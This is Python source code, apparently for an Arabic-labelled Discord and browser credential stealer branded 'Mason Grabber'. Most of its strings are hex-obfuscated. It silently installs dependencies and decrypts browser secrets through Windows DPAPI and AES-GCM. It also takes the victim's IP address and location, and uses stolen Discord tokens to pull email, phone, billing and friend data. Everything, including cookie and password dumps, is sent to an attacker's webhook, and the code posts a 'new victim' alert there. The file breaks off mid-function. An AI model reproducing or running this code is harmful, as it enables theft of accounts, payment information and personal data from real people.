import os, threading
from sys import executable
from sqlite3 import connect as sql_connect
import re
from base64 import b64decode
from json import loads as json_loads, load
from ctypes import windll, wintypes, byref, cdll, Structure, POINTER, c_char, c_buffer
from urllib.request import Request, urlopen
from json import loads, dumps
import time, shutil
from zipfile import ZipFile
import random, subprocess, platform, socket
import time, os
import getpass
whook = "%whook%"
try:
    from PIL import ImageGrab
    import requests
except ModuleNotFoundError:
    os.system("\x70\x69\x70\x20\x69\x6e\x73\x74\x61\x6c\x6c\x20\x72\x65\x71\x75\x65\x73\x74\x73")
    os.system("\x70\x69\x70\x20\x69\x6e\x73\x74\x61\x6c\x6c\x20\x50\x69\x6c\x6c\x6f\x77")
def getip():
    ip = "\x4e\x6f\x6e\x65"
    ip = urlopen(Request("https://\x61\x70\x69\x2e\x69\x70\x69\x66\x79.org")).read().decode().strip()
    return ip


requirements = [["\x72\x65\x71\x75\x65\x73\x74\x73", "\x72\x65\x71\x75\x65\x73\x74\x73"], ["\x43\x72\x79\x70\x74\x6f\x2e\x43\x69\x70\x68\x65\x72", "\x70\x79\x63\x72\x79\x70\x74\x6f\x64\x6f\x6d\x65"]]
for modl in requirements:
    try:
        __import__(modl[0])
    except:
        subprocess.Popen(f"{executable} \x2d\x6d\x20\x70\x69\x70\x20\x69\x6e\x73\x74\x61\x6c\x6c {modl[1]}", shell=True)
        time.sleep(3)

import requests
from Crypto.Cipher import AES

local = os.getenv("\x4c\x4f\x43\x41\x4c\x41\x50\x50\x44\x41\x54\x41")
roaming = os.getenv("\x41\x50\x50\x44\x41\x54\x41")
temp = os.getenv("\x54\x45\x4d\x50")
Threadlist = []


class DATA_BLOB(Structure):
    _fields_ = [("\x63\x62\x44\x61\x74\x61", wintypes.DWORD), ("\x70\x62\x44\x61\x74\x61", POINTER(c_char))]


def GetData(blob_out):
    cbData = int(blob_out.cbData)
    pbData = blob_out.pbData
    buffer = c_buffer(cbData)
    cdll.msvcrt.memcpy(buffer, pbData, cbData)
    windll.kernel32.LocalFree(pbData)
    return buffer.raw


def CryptUnprotectData(encrypted_bytes, entropy=b""):
    buffer_in = c_buffer(encrypted_bytes, len(encrypted_bytes))
    buffer_entropy = c_buffer(entropy, len(entropy))
    blob_in = DATA_BLOB(len(encrypted_bytes), buffer_in)
    blob_entropy = DATA_BLOB(len(entropy), buffer_entropy)
    blob_out = DATA_BLOB()

    if windll.crypt32.CryptUnprotectData(byref(blob_in), None,
                                         byref(blob_entropy), None, None, 0x01,
                                         byref(blob_out)):
        return GetData(blob_out)


def DecryptValue(buff, master_key=None):
    starts = buff.decode(encoding="\x75\x74\x66\x38", errors="\x69\x67\x6e\x6f\x72\x65")[:3]
    if starts == "\x76\x31\x30" or starts == "\x76\x31\x31":
        iv = buff[3:15]
        payload = buff[15:]
        cipher = AES.new(master_key, AES.MODE_GCM, iv)
        decrypted_pass = cipher.decrypt(payload)
        decrypted_pass = decrypted_pass[:-16].decode()
        return decrypted_pass


def LoadRequests(methode, url, data="", files="", headers=""):
    for i in range(8):  
        if methode == "\x50\x4f\x53\x54":
            if data != "":
                r = requests.post(url, data=data)
                if r.status_code == 200:
                    return r
            elif files != "":
                r = requests.post(url, files=files)
                if (r.status_code == 200
                        or r.status_code == 413):
                    return r


def LoadUrlib(whook, data="", files="", headers=""):
    for i in range(8):
        if headers != "":
            r = urlopen(Request(whook, data=data, headers=headers))
            return r
        else:
            r = urlopen(Request(whook, data=data))
            return r


payload = {"\x63\x6f\x6e\x74\x65\x6e\x74": "\x40\x65\x76\x65\x72\x79\x6f\x6e\x65 **ضحيه جديد **"}

response = requests.post(whook, json=payload)


def globalInfo():
    ip = getip()
    username = os.getenv("\x55\x53\x45\x52\x4e\x41\x4d\x45")
    ipdatanojson = (urlopen(Request(
        f"https://\x67\x65\x6f\x6c\x6f\x63\x61\x74\x69\x6f\x6e\x2d\x64\x62.com/jsonp/{ip}")).read().decode().replace(
            "\x63\x61\x6c\x6c\x62\x61\x63\x6b(", "").replace("})", "}"))
    ipdata = loads(ipdatanojson)
    contry = ipdata["\x63\x6f\x75\x6e\x74\x72\x79\x5f\x6e\x61\x6d\x65"]
    contryCode = ipdata["\x63\x6f\x75\x6e\x74\x72\x79\x5f\x63\x6f\x64\x65"].lower()
    globalinfo = f":flag_{contryCode}:   -   `{username.upper()} - {ip} [{contry}]`"
    return globalinfo


def Trust(Cookies):
    global DETECTED
    data = str(Cookies)
    tim = re.findall(".\x67\x6f\x6f\x67\x6c\x65.com", data)
    if len(tim) < 1:
        DETECTED = True
        return DETECTED
    else:
        DETECTED = False
        return DETECTED


def GetUHQFriends(token):
    badgeList = [
        {
            "\x4e\x61\x6d\x65": "\x45\x61\x72\x6c\x79\x5f\x56\x65\x72\x69\x66\x69\x65\x64\x5f\x42\x6f\x74\x5f\x44\x65\x76\x65\x6c\x6f\x70\x65\x72",
            "\x56\x61\x6c\x75\x65": 131072,
            "\x45\x6d\x6f\x6a\x69": "\x3c\x3a\x64\x65\x76\x65\x6c\x6f\x70\x65\x72\x3a\x38\x37\x34\x37\x35\x30\x38\x30\x38\x34\x37\x32\x38\x32\x35\x39\x38\x36\x3e\x20",
        },
        {
            "\x4e\x61\x6d\x65": "\x42\x75\x67\x5f\x48\x75\x6e\x74\x65\x72\x5f\x4c\x65\x76\x65\x6c\x5f\x32",
            "\x56\x61\x6c\x75\x65": 16384,
            "\x45\x6d\x6f\x6a\x69": "\x3c\x3a\x62\x75\x67\x68\x75\x6e\x74\x65\x72\x5f\x32\x3a\x38\x37\x34\x37\x35\x30\x38\x30\x38\x34\x33\x30\x38\x37\x34\x36\x36\x34\x3e ",
        },
        {
            "\x4e\x61\x6d\x65": "\x45\x61\x72\x6c\x79\x5f\x53\x75\x70\x70\x6f\x72\x74\x65\x72",
            "\x56\x61\x6c\x75\x65": 512,
            "\x45\x6d\x6f\x6a\x69": "\x3c\x3a\x65\x61\x72\x6c\x79\x5f\x73\x75\x70\x70\x6f\x72\x74\x65\x72\x3a\x38\x37\x34\x37\x35\x30\x38\x30\x38\x34\x31\x34\x31\x31\x33\x38\x32\x33\x3e ",
        },
        {
            "\x4e\x61\x6d\x65": "\x48\x6f\x75\x73\x65\x5f\x42\x61\x6c\x61\x6e\x63\x65",
            "\x56\x61\x6c\x75\x65": 256,
            "\x45\x6d\x6f\x6a\x69": "\x3c\x3a\x62\x61\x6c\x61\x6e\x63\x65\x3a\x38\x37\x34\x37\x35\x30\x38\x30\x38\x32\x36\x37\x32\x39\x32\x36\x38\x33\x3e ",
        },
        {
            "\x4e\x61\x6d\x65": "\x48\x6f\x75\x73\x65\x5f\x42\x72\x69\x6c\x6c\x69\x61\x6e\x63\x65",
            "\x56\x61\x6c\x75\x65": 128,
            "\x45\x6d\x6f\x6a\x69": "\x3c\x3a\x62\x72\x69\x6c\x6c\x69\x61\x6e\x63\x65\x3a\x38\x37\x34\x37\x35\x30\x38\x30\x38\x33\x33\x38\x36\x30\x38\x31\x39\x39\x3e ",
        },
        {
            "\x4e\x61\x6d\x65": "\x48\x6f\x75\x73\x65\x5f\x42\x72\x61\x76\x65\x72\x79",
            "\x56\x61\x6c\x75\x65": 64,
            "\x45\x6d\x6f\x6a\x69": "\x3c\x3a\x62\x72\x61\x76\x65\x72\x79\x3a\x38\x37\x34\x37\x35\x30\x38\x30\x38\x33\x38\x38\x39\x35\x32\x30\x37\x35\x3e ",
        },
        {
            "\x4e\x61\x6d\x65": "\x42\x75\x67\x5f\x48\x75\x6e\x74\x65\x72\x5f\x4c\x65\x76\x65\x6c\x5f\x31",
            "\x56\x61\x6c\x75\x65": 8,
            "\x45\x6d\x6f\x6a\x69": "\x3c\x3a\x62\x75\x67\x68\x75\x6e\x74\x65\x72\x5f\x31\x3a\x38\x37\x34\x37\x35\x30\x38\x30\x38\x34\x32\x36\x36\x39\x32\x36\x35\x38\x3e ",
        },
        {
            "\x4e\x61\x6d\x65": "\x48\x79\x70\x65\x53\x71\x75\x61\x64\x5f\x45\x76\x65\x6e\x74\x73",
            "\x56\x61\x6c\x75\x65": 4,
            "\x45\x6d\x6f\x6a\x69": "\x3c\x3a\x68\x79\x70\x65\x73\x71\x75\x61\x64\x5f\x65\x76\x65\x6e\x74\x73\x3a\x38\x37\x34\x37\x35\x30\x38\x30\x38\x35\x39\x34\x34\x37\x37\x30\x35\x36\x3e ",
        },
        {
            "\x4e\x61\x6d\x65": "\x50\x61\x72\x74\x6e\x65\x72\x65\x64\x5f\x53\x65\x72\x76\x65\x72\x5f\x4f\x77\x6e\x65\x72",
            "\x56\x61\x6c\x75\x65": 2,
            "\x45\x6d\x6f\x6a\x69": "\x3c\x3a\x70\x61\x72\x74\x6e\x65\x72\x3a\x38\x37\x34\x37\x35\x30\x38\x30\x38\x36\x37\x38\x33\x35\x34\x39\x36\x34\x3e ",
        },
        {
            "\x4e\x61\x6d\x65": "\x44\x69\x73\x63\x6f\x72\x64\x5f\x45\x6d\x70\x6c\x6f\x79\x65\x65",
            "\x56\x61\x6c\x75\x65": 1,
            "\x45\x6d\x6f\x6a\x69": "\x3c\x3a\x73\x74\x61\x66\x66\x3a\x38\x37\x34\x37\x35\x30\x38\x30\x38\x37\x32\x38\x36\x36\x36\x31\x35\x32\x3e ",
        },
    ]
    headers = {
        "\x41\x75\x74\x68\x6f\x72\x69\x7a\x61\x74\x69\x6f\x6e":
        token,
        "\x43\x6f\x6e\x74\x65\x6e\x74\x2d\x54\x79\x70\x65":
        "\x61\x70\x70\x6c\x69\x63\x61\x74\x69\x6f\x6e\x2f\x6a\x73\x6f\x6e",
        "\x55\x73\x65\x72\x2d\x41\x67\x65\x6e\x74":
        "\x4d\x6f\x7a\x69\x6c\x6c\x61\x2f\x35\x2e\x30\x20\x28\x57\x69\x6e\x64\x6f\x77\x73\x20\x4e\x54\x20\x31\x30\x2e\x30\x3b\x20\x57\x69\x6e\x36\x34\x3b\x20\x78\x36\x34\x3b\x20\x72\x76\x3a\x31\x30\x32\x2e\x30\x29\x20\x47\x65\x63\x6b\x6f\x2f\x32\x30\x31\x30\x30\x31\x30\x31\x20\x46\x69\x72\x65\x66\x6f\x78\x2f\x31\x30\x32\x2e\x30",
    }
    try:
        friendlist = loads(
            urlopen(
                Request(
                    "https://\x64\x69\x73\x63\x6f\x72\x64.com/api/v6/users/@me/relationships",
                    headers=headers,
                )).read().decode())
    except:
        return False

    uhqlist = ""
    for friend in friendlist:
        OwnedBadges = ""
        flags = friend["\x75\x73\x65\x72"]["\x70\x75\x62\x6c\x69\x63\x5f\x66\x6c\x61\x67\x73"]
        for badge in badgeList:
            if flags // badge["\x56\x61\x6c\x75\x65"] != 0 and friend["\x74\x79\x70\x65"] == 1:
                if not "\x48\x6f\x75\x73\x65" in badge["\x4e\x61\x6d\x65"]:
                    OwnedBadges += badge["\x45\x6d\x6f\x6a\x69"]
                flags = flags % badge["\x56\x61\x6c\x75\x65"]
        if OwnedBadges != "":
            uhqlist += f"{OwnedBadges} | {friend['user']['username']}#{friend['user']['discriminator']} ({friend['user']['id']})\n"
    return uhqlist


def GetBilling(token):
    headers = {
        "\x41\x75\x74\x68\x6f\x72\x69\x7a\x61\x74\x69\x6f\x6e":
        token,
        "\x43\x6f\x6e\x74\x65\x6e\x74\x2d\x54\x79\x70\x65":
        "\x61\x70\x70\x6c\x69\x63\x61\x74\x69\x6f\x6e\x2f\x6a\x73\x6f\x6e",
        "\x55\x73\x65\x72\x2d\x41\x67\x65\x6e\x74":
        "\x4d\x6f\x7a\x69\x6c\x6c\x61\x2f\x35\x2e\x30\x20\x28\x57\x69\x6e\x64\x6f\x77\x73\x20\x4e\x54\x20\x31\x30\x2e\x30\x3b\x20\x57\x69\x6e\x36\x34\x3b\x20\x78\x36\x34\x3b\x20\x72\x76\x3a\x31\x30\x32\x2e\x30\x29\x20\x47\x65\x63\x6b\x6f\x2f\x32\x30\x31\x30\x30\x31\x30\x31\x20\x46\x69\x72\x65\x66\x6f\x78\x2f\x31\x30\x32\x2e\x30",
    }
    try:
        billingjson = loads(
            urlopen(
                Request(
                    "https://\x64\x69\x73\x63\x6f\x72\x64.com/api/users/@me/billing/payment-sources",
                    headers=headers,
                )).read().decode())
    except:
        return False

    if billingjson == []:
        return "\x3f"

    billing = ""
    for methode in billingjson:
        if methode["\x69\x6e\x76\x61\x6c\x69\x64"] == False:
            if methode["\x74\x79\x70\x65"] == 1:
                billing += "\x3a\x63\x72\x65\x64\x69\x74\x5f\x63\x61\x72\x64\x3a"
            elif methode["\x74\x79\x70\x65"] == 2:
                billing += "\x3a\x70\x61\x72\x6b\x69\x6e\x67\x3a "

    return billing


def GetBadge(flags):
    if flags == 0:
        return ""

    OwnedBadges = ""
    badgeList = [
        {
            "\x4e\x61\x6d\x65": "\x45\x61\x72\x6c\x79\x5f\x56\x65\x72\x69\x66\x69\x65\x64\x5f\x42\x6f\x74\x5f\x44\x65\x76\x65\x6c\x6f\x70\x65\x72",
            "\x56\x61\x6c\x75\x65": 131072,
            "\x45\x6d\x6f\x6a\x69": "\x3c\x3a\x64\x65\x76\x65\x6c\x6f\x70\x65\x72\x3a\x38\x37\x34\x37\x35\x30\x38\x30\x38\x34\x37\x32\x38\x32\x35\x39\x38\x36\x3e ",
        },
        {
            "\x4e\x61\x6d\x65": "\x42\x75\x67\x5f\x48\x75\x6e\x74\x65\x72\x5f\x4c\x65\x76\x65\x6c\x5f\x32",
            "\x56\x61\x6c\x75\x65": 16384,
            "\x45\x6d\x6f\x6a\x69": "\x3c\x3a\x62\x75\x67\x68\x75\x6e\x74\x65\x72\x5f\x32\x3a\x38\x37\x34\x37\x35\x30\x38\x30\x38\x34\x33\x30\x38\x37\x34\x36\x36\x34\x3e ",
        },
        {
            "\x4e\x61\x6d\x65": "\x45\x61\x72\x6c\x79\x5f\x53\x75\x70\x70\x6f\x72\x74\x65\x72",
            "\x56\x61\x6c\x75\x65": 512,
            "\x45\x6d\x6f\x6a\x69": "\x3c\x3a\x65\x61\x72\x6c\x79\x5f\x73\x75\x70\x70\x6f\x72\x74\x65\x72\x3a\x38\x37\x34\x37\x35\x30\x38\x30\x38\x34\x31\x34\x31\x31\x33\x38\x32\x33\x3e ",
        },
        {
            "\x4e\x61\x6d\x65": "\x48\x6f\x75\x73\x65\x5f\x42\x61\x6c\x61\x6e\x63\x65",
            "\x56\x61\x6c\x75\x65": 256,
            "\x45\x6d\x6f\x6a\x69": "\x3c\x3a\x62\x61\x6c\x61\x6e\x63\x65\x3a\x38\x37\x34\x37\x35\x30\x38\x30\x38\x32\x36\x37\x32\x39\x32\x36\x38\x33\x3e ",
        },
        {
            "\x4e\x61\x6d\x65": "\x48\x6f\x75\x73\x65\x5f\x42\x72\x69\x6c\x6c\x69\x61\x6e\x63\x65",
            "\x56\x61\x6c\x75\x65": 128,
            "\x45\x6d\x6f\x6a\x69": "\x3c\x3a\x62\x72\x69\x6c\x6c\x69\x61\x6e\x63\x65\x3a\x38\x37\x34\x37\x35\x30\x38\x30\x38\x33\x33\x38\x36\x30\x38\x31\x39\x39\x3e ",
        },
        {
            "\x4e\x61\x6d\x65": "\x48\x6f\x75\x73\x65\x5f\x42\x72\x61\x76\x65\x72\x79",
            "\x56\x61\x6c\x75\x65": 64,
            "\x45\x6d\x6f\x6a\x69": "\x3c\x3a\x62\x72\x61\x76\x65\x72\x79\x3a\x38\x37\x34\x37\x35\x30\x38\x30\x38\x33\x38\x38\x39\x35\x32\x30\x37\x35\x3e ",
        },
        {
            "\x4e\x61\x6d\x65": "\x42\x75\x67\x5f\x48\x75\x6e\x74\x65\x72\x5f\x4c\x65\x76\x65\x6c\x5f\x31",
            "\x56\x61\x6c\x75\x65": 8,
            "\x45\x6d\x6f\x6a\x69": "\x3c\x3a\x62\x75\x67\x68\x75\x6e\x74\x65\x72\x5f\x31\x3a\x38\x37\x34\x37\x35\x30\x38\x30\x38\x34\x32\x36\x36\x39\x32\x36\x35\x38\x3e ",
        },
        {
            "\x4e\x61\x6d\x65": "\x48\x79\x70\x65\x53\x71\x75\x61\x64\x5f\x45\x76\x65\x6e\x74\x73",
            "\x56\x61\x6c\x75\x65": 4,
            "\x45\x6d\x6f\x6a\x69": "\x3c\x3a\x68\x79\x70\x65\x73\x71\x75\x61\x64\x5f\x65\x76\x65\x6e\x74\x73\x3a\x38\x37\x34\x37\x35\x30\x38\x30\x38\x35\x39\x34\x34\x37\x37\x30\x35\x36\x3e ",
        },
        {
            "\x4e\x61\x6d\x65": "\x50\x61\x72\x74\x6e\x65\x72\x65\x64\x5f\x53\x65\x72\x76\x65\x72\x5f\x4f\x77\x6e\x65\x72",
            "\x56\x61\x6c\x75\x65": 2,
            "\x45\x6d\x6f\x6a\x69": "\x3c\x3a\x70\x61\x72\x74\x6e\x65\x72\x3a\x38\x37\x34\x37\x35\x30\x38\x30\x38\x36\x37\x38\x33\x35\x34\x39\x36\x34\x3e ",
        },
        {
            "\x4e\x61\x6d\x65": "\x44\x69\x73\x63\x6f\x72\x64\x5f\x45\x6d\x70\x6c\x6f\x79\x65\x65",
            "\x56\x61\x6c\x75\x65": 1,
            "\x45\x6d\x6f\x6a\x69": "\x3c\x3a\x73\x74\x61\x66\x66\x3a\x38\x37\x34\x37\x35\x30\x38\x30\x38\x37\x32\x38\x36\x36\x36\x31\x35\x32\x3e ",
        },
    ]
    for badge in badgeList:
        if flags // badge["\x56\x61\x6c\x75\x65"] != 0:
            OwnedBadges += badge["\x45\x6d\x6f\x6a\x69"]
            flags = flags % badge["\x56\x61\x6c\x75\x65"]

    return OwnedBadges


def GetTokenInfo(token):
    headers = {
        "\x41\x75\x74\x68\x6f\x72\x69\x7a\x61\x74\x69\x6f\x6e":
        token,
        "\x43\x6f\x6e\x74\x65\x6e\x74\x2d\x54\x79\x70\x65":
        "\x61\x70\x70\x6c\x69\x63\x61\x74\x69\x6f\x6e\x2f\x6a\x73\x6f\x6e",
        "\x55\x73\x65\x72\x2d\x41\x67\x65\x6e\x74":
        "\x4d\x6f\x7a\x69\x6c\x6c\x61\x2f\x35\x2e\x30\x20\x28\x57\x69\x6e\x64\x6f\x77\x73\x20\x4e\x54\x20\x31\x30\x2e\x30\x3b\x20\x57\x69\x6e\x36\x34\x3b\x20\x78\x36\x34\x3b\x20\x72\x76\x3a\x31\x30\x32\x2e\x30\x29\x20\x47\x65\x63\x6b\x6f\x2f\x32\x30\x31\x30\x30\x31\x30\x31\x20\x46\x69\x72\x65\x66\x6f\x78\x2f\x31\x30\x32\x2e0",
    }

    userjson = loads(
        urlopen(
            Request("https://\x64\x69\x73\x63\x6f\x72\x64\x61\x70\x70.com/api/v6/users/@me",
                    headers=headers)).read().decode())
    username = userjson["\x75\x73\x65\x72\x6e\x61\x6d\x65"]
    hashtag = userjson["\x64\x69\x73\x63\x72\x69\x6d\x69\x6e\x61\x74\x6f\x72"]
    email = userjson["\x65\x6d\x61\x69\x6c"]
    idd = userjson["\x69\x64"]
    pfp = userjson["\x61\x76\x61\x74\x61\x72"]
    flags = userjson["\x70\x75\x62\x6c\x69\x63\x5f\x66\x6c\x61\x67\x73"]
    nitro = ""
    phone = "\x2d"

    if "\x70\x72\x65\x6d\x69\x75\x6d\x5f\x74\x79\x70\x65" in userjson:
        nitrot = userjson["\x70\x72\x65\x6d\x69\x75\x6d\x5f\x74\x79\x70\x65"]
        if nitrot == 1:
            nitro = "\x3c\x3a\x63\x6c\x61\x73\x73\x69\x63\x3a\x38\x39\x36\x31\x31\x39\x31\x37\x31\x30\x31\x39\x30\x36\x37\x34\x32\x33\x3e "
        elif nitrot == 2:
            nitro = "\x3c\x61\x3a\x62\x6f\x6f\x73\x74\x3a\x38\x32\x34\x30\x33\x36\x37\x37\x38\x35\x37\x30\x34\x31\x36\x31\x32\x39\x3e\x20\x3c\x3a\x63\x6c\x61\x73\x73\x69\x63\x3a\x38\x39\x36\x31\x31\x39\x31\x37\x31\x30\x31\x39\x30\x36\x37\x34\x32\x33\x3e "
    if "\x70\x68\x6f\x6e\x65" in userjson:
      phone = f'```{userjson["phone"]}```'

    return username, hashtag, email, idd, pfp, flags, nitro, phone


def checkToken(token):
    headers = {
        "\x41\x75\x74\x68\x6f\x72\x69\x7a\x61\x74\x69\x6f\x6e":
        token,
        "\x43\x6f\x6e\x74\x65\x6e\x74\x2d\x54\x79\x70\x65":
        "\x61\x70\x70\x6c\x69\x63\x61\x74\x69\x6f\x6e\x2f\x6a\x73\x6f\x6e",
        "\x55\x73\x65\x72\x2d\x41\x67\x65\x6e\x74":
        "\x4d\x6f\x7a\x69\x6c\x6c\x61\x2f\x35\x2e\x30\x20\x28\x57\x69\x6e\x64\x6f\x77\x73\x20\x4e\x54\x20\x31\x30\x2e\x30\x3b\x20\x57\x69\x6e\x36\x34\x3b\x20\x78\x36\x34\x3b\x20\x72\x76\x3a\x31\x30\x32\x2e\x30\x29\x20\x47\x65\x63\x6b\x6f\x2f\x32\x30\x31\x30\x30\x31\x30\x31\x20\x46\x69\x72\x65\x66\x6f\x78\x2f\x31\x30\x32\x2e\x30",
    }
    try:
        urlopen(
            Request("https://\x64\x69\x73\x63\x6f\x72\x64\x61\x70\x70.com/api/v6/users/@me",
                    headers=headers))
        return True
    except:
        return False


def uploadToken(token, path):
    global whook
    headers = {
        "\x43\x6f\x6e\x74\x65\x6e\x74\x2d\x54\x79\x70\x65":
        "\x61\x70\x70\x6c\x69\x63\x61\x74\x69\x6f\x6e\x2f\x6a\x73\x6f\x6e",
        "\x55\x73\x65\x72\x2d\x41\x67\x65\x6e\x74":
        "\x4d\x6f\x7a\x69\x6c\x6c\x61\x2f\x35\x2e\x30\x20\x28\x57\x69\x6e\x64\x6f\x77\x73\x20\x4e\x54\x20\x31\x30\x2e\x30\x3b\x20\x57\x69\x6e\x36\x34\x3b\x20\x78\x36\x34\x3b\x20\x72\x76\x3a\x31\x30\x32\x2e\x30\x29\x20\x47\x65\x63\x6b\x6f\x2f\x32\x30\x31\x30\x30\x31\x30\x31\x20\x46\x69\x72\x65\x66\x6f\x78\x2f\x31\x30\x32\x2e\x30",
    }
    username, hashtag, email, idd, pfp, flags, nitro, phone = GetTokenInfo(
        token)

    if pfp == None:
        pfp = "https://cdn.\x64\x69\x73\x63\x6f\x72\x64\x61\x70\x70.com/attachments/963114349877162004/992593184251183195/7c8f476123d28d103efe381543274c25.png"
    else:
        pfp = f"https://cdn.\x64\x69\x73\x63\x6f\x72\x64\x61\x70\x70.com/avatars/{idd}/{pfp}"

    billing = GetBilling(token)
    badge = GetBadge(flags)
    friends = GetUHQFriends(token)
    if friends == "":
        friends = "منبوذ"
    if not billing:
        badge, phone, billing = "🔒", "🔒", "🔒"
    if nitro == "" and badge == "":
        nitro = "?"

    data = {
        "\x63\x6f\x6e\x74\x65\x6e\x74":
        "",
        "\x65\x6d\x62\x65\x64\x73": [{
            "\x63\x6f\x6c\x6f\x72":
            0,
            "\x66\x69\x65\x6c\x64\x73": [
                {
                    "\x6e\x61\x6d\x65": "\x3a\x74\x69\x63\x6b\x65\x74\x73\x3a   -   توكن الحساب:",
                    "\x76\x61\x6c\x75\x65": f"```{token}```",
                },
                {
                    "\x6e\x61\x6d\x65": "\x3a\x65\x61\x72\x74\x68\x5f\x61\x73\x69\x61\x3a   -   اليميل:",
                    "\x76\x61\x6c\x75\x65": f"```{email}```",
                    "\x69\x6e\x6c\x69\x6e\x65": True,
                },
                {
                    "\x6e\x61\x6d\x65": "\x3a\x74\x65\x6c\x65\x70\x68\x6f\x6e\x65\x5f\x72\x65\x63\x65\x69\x76\x65\x72\x3a   -   رقم الجوال:",
                    "\x76\x61\x6c\x75\x65": f"{phone}",
                    "\x69\x6e\x6c\x69\x6e\x65": True,
                },
                {
                    "\x6e\x61\x6d\x65": "\x3a\x67\x6c\x6f\x62\x65\x5f\x77\x69\x74\x68\x5f\x6d\x65\x72\x69\x64\x69\x61\x6e\x73\x3a   -   الايبي:",
                    "\x76\x61\x6c\x75\x65": f"```{getip()}```",
                    "\x69\x6e\x6c\x69\x6e\x65": True,
                },
                {
                    "\x6e\x61\x6d\x65": "\x3a\x63\x72\x65\x64\x69\x74\x5f\x63\x61\x72\x64\x3a   -   البطاقه:",
                    "\x76\x61\x6c\x75\x65": f"{billing}",
                    "\x69\x6e\x6c\x69\x6e\x65": True,
                },
                {
                    "\x6e\x61\x6d\x65": "\x3a\x6f\x66\x66\x69\x63\x65\x3a   -   الاخويا:",
                    "\x76\x61\x6c\x75\x65": f"{friends}",
                    "\x69\x6e\x6c\x69\x6e\x65": False,
                },
            ],
            "\x61\x75\x74\x68\x6f\x72": {
                "\x6e\x61\x6d\x65": f"{username}#{hashtag} ({idd})",
                "\x69\x63\x6f\x6e\x5f\x75\x72\x6c": f"{pfp}",
            },
            "\x66\x6f\x6f\x74\x65\x72": {
                "\x74\x65\x78\x74": "\x68\x74\x74\x70\x73\x3a\x2f\x2f\x77\x77\x77\x2e\x79\x6f\x75\x74\x75\x62\x65\x2e\x63\x6f\x6d\x2f\x40\x47\x72\x77\x62",
                "\x69\x63\x6f\x6e\x5f\x75\x72\x6c": "",
            },
            "\x74\x68\x75\x6d\x62\x6e\x61\x69\x6c": {
                "\x75\x72\x6c": f"{pfp}"
            },
        }],
        "\x61\x76\x61\x74\x61\x72\x5f\x75\x72\x6c":
        "",
        "\x75\x73\x65\x72\x6e\x61\x6d\x65":
        "\x4d\x61\x73\x6f\x6e\x20\x47\x72\x61\x62\x62\x65\x72",
        "\x61\x74\x74\x61\x63\x68\x6d\x65\x6e\x74\x73": [],
    }
    LoadUrlib(whook, data=dumps(data).encode(), headers=headers)


def Reformat(listt):
    e = re.findall("(\w+[a-z])", listt)
    while "\x68\x74\x74\x70\x73" in e:
        e.remove("\x68\x74\x74\x70\x73")
    while "\x63\x6f\x6d" in e:
        e.remove("\x63\x6f\x6d")
    while "\x6e\x65\x74" in e:
        e.remove("\x6e\x65\x74")
    return list(set(e))


def upload(name, link):
    headers = {
        "\x43\x6f\x6e\x74\x65\x6e\x74\x2d\x54\x79\x70\x65":
        "\x61\x70\x70\x6c\x69\x63\x61\x74\x69\x6f\x6e\x2f\x6a\x73\x6f\x6e",
        "\x55\x73\x65\x72\x2d\x41\x67\x65\x6e\x74":
        "\x4d\x6f\x7a\x69\x6c\x6c\x61\x2f\x35\x2e\x30\x20\x28\x57\x69\x6e\x64\x6f\x77\x73\x20\x4e\x54\x20\x31\x30\x2e\x30\x3b\x20\x57\x69\x6e\x36\x34\x3b\x20\x78\x36\x34\x3b\x20\x72\x76\x3a\x31\x30\x32\x2e\x30\x29\x20\x47\x65\x63\x6b\x6f\x2f\x32\x30\x31\x30\x30\x31\x30\x31\x20\x46\x69\x72\x65\x66\x6f\x78\x2f\x31\x30\x32\x2e\x30",
    }

    if name == "\x77\x70\x63\x6f\x6f\x6b":
        rb = "   -   ".join(da for da in cookiWords)
        if len(rb) > 1000:
            rrrrr = Reformat(str(cookiWords))
            rb = "   -   ".join(da for da in rrrrr)
        data = {
            "\x63\x6f\x6e\x74\x65\x6e\x74":
            "",
            "\x65\x6d\x62\x65\x64\x73": [{
                "\x74\x69\x74\x6c\x65": "تم سحب الكوكيز ",
                "\x64\x65\x73\x63\x72\x69\x70\x74\x69\x6f\x6e":
                f"**المواقع الي جبناها**:\n{rb}\n\n**البيانات:**\n**{CookiCount}** \x43\x6f\x6f\x6b\x69\x65\x73 \n[اضغط هنا لتحميل كوكيز الضحيه]({link})",
                "\x63\x6f\x6c\x6f\x72": 0,
                "\x66\x6f\x6f\x74\x65\x72": {
                    "\x74\x65\x78\x74": "\x68\x74\x74\x70\x73\x3a\x2f\x2f\x77\x77\x77\x2e\x79\x6f\x75\x74\x75\x62\x65\x2e\x63\x6f\x6d\x2f\x40\x47\x72\x77\x62",
                    "\x69\x63\x6f\x6e\x5f\x75\x72\x6c": "",
                },
            }],
            "\x75\x73\x65\x72\x6e\x61\x6d\x65":
            "\x4d\x61\x73\x6f\x6e\x20\x47\x72\x61\x62\x62\x65\x72",
            "\x61\x76\x61\x74\x61\x72\x5f\x75\x72\x6c":
            "",
            "\x61\x74\x74\x61\x63\x68\x6d\x65\x6e\x74\x73": [],
        }
        LoadUrlib(whook, data=dumps(data).encode(), headers=headers)
        return

    if name == "\x77\x70\x70\x61\x73\x73\x77":
        ra = "  \x2d  ".join(da for da in paswWords)
        if len(ra) > 1000:
            rrr = Reformat(str(paswWords))
            ra = "  \x2d  ".join(da for da in rrr)

        data = {
            "\x63\x6f\x6e\x74\x65\x6e\x74":
            "",
            "\x65\x6d\x62\x65\x64\x73": [{
                "\x74\x69\x74\x6c\x65": "تم سحب الباسات",
                "\x64\x65\x73\x63\x72\x69\x70\x74\x69\x6f\x6e":
                f"**المواقع الي جبناها**:\n{ra}\n\n**البيانات:**\n**{PasswCount}** Cookies \n[اضغط هنا لتحميل باسات الضحيه]({link})",
                "\x63\x6f\x6c\x6f\x72": 0,
                "\x66\x6f\x6f\x74\x65\x72": {
                    "\x74\x65\x78\x74": "\x68\x74\x74\x70\x73\x3a\x2f\x2f\x77\x77\x77\x2e\x79\x6f\x75\x74\x75\x62\x65\x2e\x63\x6f\x6d\x2f\x40\x47\x72\x77\x62",
                    "\x69\x63\x6f\x6e\x5f\x75\x72\x6c": "",
                },
            }],
            "\x75\x73\x65\x72\x6e\x61\x6d\x65":
            "\x4d\x61\x73\x6f\x6e\x20\x47\x72\x61\x62\x62\x65\x72",
            "\x61\x76\x61\x74\x61\x72\x5f\x75\x72\x6c":
            "",
            "\x61\x74\x74\x61\x63\x68\x6d\x65\x6e\x74\x73": [],
        }
        LoadUrlib(whook, data=dumps(data).encode(), headers=headers)
        return
    
def writeforfile(data, name):
